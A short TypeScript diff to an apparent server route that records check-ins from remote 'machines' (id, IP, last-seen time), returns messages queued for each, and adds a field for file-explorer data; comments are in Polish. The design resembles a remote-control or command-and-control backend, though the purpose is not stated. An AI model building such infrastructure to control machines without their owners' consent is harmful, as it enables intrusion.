@@ -4,12 +4,12 @@ import { clients } from '@/lib/store';
 export async function POST(req: Request) {
   try {
     const body = await req.json();
-    const id = body.id || "Nieznany Maszyna";
+    const id = body.id || body.deviceId || "Nieznana Maszyna";
     
     // Odczytywanie IP
     const ip = req.headers.get("x-forwarded-for") || "Nieznane IP";
 
-    const client = clients.get(id) || { id, ip, lastSeen: 0, messages: [] };
+    const client = clients.get(id) || { id, ip, lastSeen: 0, messages: [], explorerData: null };
     const messagesToSend = [...client.messages];
     
     client.lastSeen = Date.now();
